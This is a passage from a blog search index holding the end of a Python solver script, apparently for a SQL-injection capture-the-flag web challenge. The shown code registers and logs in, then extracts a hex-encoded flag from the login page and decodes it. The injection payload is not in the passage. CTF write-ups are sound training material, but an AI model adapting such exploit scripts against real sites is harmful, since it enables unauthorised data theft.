string">"password"</span><span class="token punctuation">:</span> <span class="token string">'1'</span>    <span class="token punctuation">}</span>    res_register <span class="token operator">=</span> res<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_register<span class="token punctuation">,</span>register_data<span class="token punctuation">)</span>    res_login <span class="token operator">=</span> res<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_login<span class="token punctuation">,</span>login_data<span class="token punctuation">)</span>    flag1 <span class="token operator">+=</span> str<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>res_login<span class="token punctuation">.</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">,</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    flag2 <span class="token operator">=</span> int<span class="token punctuation">(</span>flag1<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    flag3 <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>flag2<span class="token punctuation">)</span>    flag_final <span class="token operator">=</span> int<span class="token punctuation">(</span>flag3<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag_final<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF_WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
